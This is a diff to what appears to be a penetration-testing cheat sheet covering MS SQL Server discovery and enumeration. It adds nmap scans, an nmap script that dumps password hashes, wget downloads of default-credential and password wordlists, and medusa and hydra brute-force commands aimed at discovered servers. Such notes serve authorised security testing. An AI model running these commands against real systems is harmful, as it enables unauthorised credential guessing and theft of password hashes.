@@ -189,7 +189,9 @@ Discovery:
 ```
 # from the wire:
 nmap -sS -Pn -n -p1433 -iL IP-ranges.txt -oG - --open | grep -E -v 'Nmap|Status' | cut -d' ' -f2 | tee mssqlServices.txt
-udp-proto-scanner.pl --probe_name ms-sql <IPs>
+udp-proto-scanner.pl --probe_name ms-sql <IPs> | tee udpprobe-mssql.out | extractIPs >> mssqlServices.txt
+sort -u mssqlServices.txt -o mssqlServices.txt
+
 nmap --script broadcast-ms-sql-discover
 
 # from previous scans:
@@ -202,11 +204,18 @@ Enumeration:
 
 Check for empty passwords:
 
-    nmap -p 1433 --script ms-sql-empty-password -iL mssqlServices.txt -v
+    nmap -p 1433 --script=ms-sql-empty-password,ms-sql-dump-hashes -iL mssqlServices.txt -v
 
-Brute force attack:
+Brute force attack (default creds):
 
-    hydra -s 1433 -t 4 -T 8 -L ~/PAYLOADS/PASSWD/mssql-users.txt -P ~/PAYLOADS/PASSWD/mssql-passwds.txt -M mssqlServices.txt mssql
+    wget https://raw.githubusercontent.com/wintrmvte/medusa_combo_files/master/mssql_default_66.txt
+    medusa -M mssql -C mssql_default_66.txt -H mssqlServices.txt -T 4 -t 1
+
+Brute force attack (weak passwords):
+
+    wget https://raw.githubusercontent.com/x90skysn3k/brutespray/master/wordlist/mssql/user -O mssql-users.txt
+    wget https://raw.githubusercontent.com/x90skysn3k/brutespray/master/wordlist/mssql/password -O mssql-passwds.txt
+    hydra -s 1433 -t 1 -T 6 -L mssql-users.txt -P mssql-passwds.txt -M mssqlServices.txt mssql
 
 ### WinRM service
 
